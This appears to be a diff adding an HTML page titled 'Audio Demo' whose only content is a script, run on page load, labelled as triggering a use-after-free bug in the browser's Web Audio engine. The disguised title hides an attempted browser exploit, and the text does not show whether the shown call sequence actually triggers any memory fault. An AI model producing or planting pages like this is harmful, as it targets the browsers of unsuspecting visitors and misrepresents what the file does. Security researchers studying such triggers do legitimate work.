@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Audio Demo</title>
+</head>
+<body>
+    <script>
+        async function triggerUAF() {
+            const ctx = new AudioContext();
+            let nodes = [];
+            for (let i = 0; i < 1000; i++) {
+                let node = ctx.createOscillator();
+                node.connect(ctx.destination);
+                nodes.push(node);
+            }
+            let target = nodes[500];
+            target.disconnect();
+            nodes = null;
+            await new Promise(resolve => setTimeout(resolve, 0));
+            target.connect(ctx.destination); // Trigger UAF
+        }
+        triggerUAF();
+    </script>
+</body>
+</html>
